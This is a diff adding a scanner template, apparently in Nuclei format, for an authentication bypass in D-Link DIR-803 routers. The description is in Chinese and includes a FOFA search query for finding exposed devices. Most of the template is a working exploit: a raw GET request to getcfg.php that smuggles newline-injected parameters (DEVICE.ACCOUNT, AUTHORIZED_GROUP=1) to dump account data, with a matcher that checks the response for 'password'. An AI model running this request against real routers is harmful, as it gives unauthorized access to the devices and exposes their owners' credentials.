@@ -1,0 +1,28 @@
+id: d-link-dir-803-auth-bypass
+
+info:
+  name: "D-Link DIR-803 路由器身份验证绕过漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="D_Link-DIR-803"
+
+    目标设备在身份验证流程中存在逻辑缺陷，攻击者可利用该缺陷绕过预期的权限控制机制，实现未授权访问。该漏洞影响D-Link DIR-803系列路由器产品，具体表现为认证凭证校验环节的逻辑处理异常。
+  tags: D-Link DIR-803
+
+http:
+- raw:
+  - |
+    GET /getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1' HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'password'
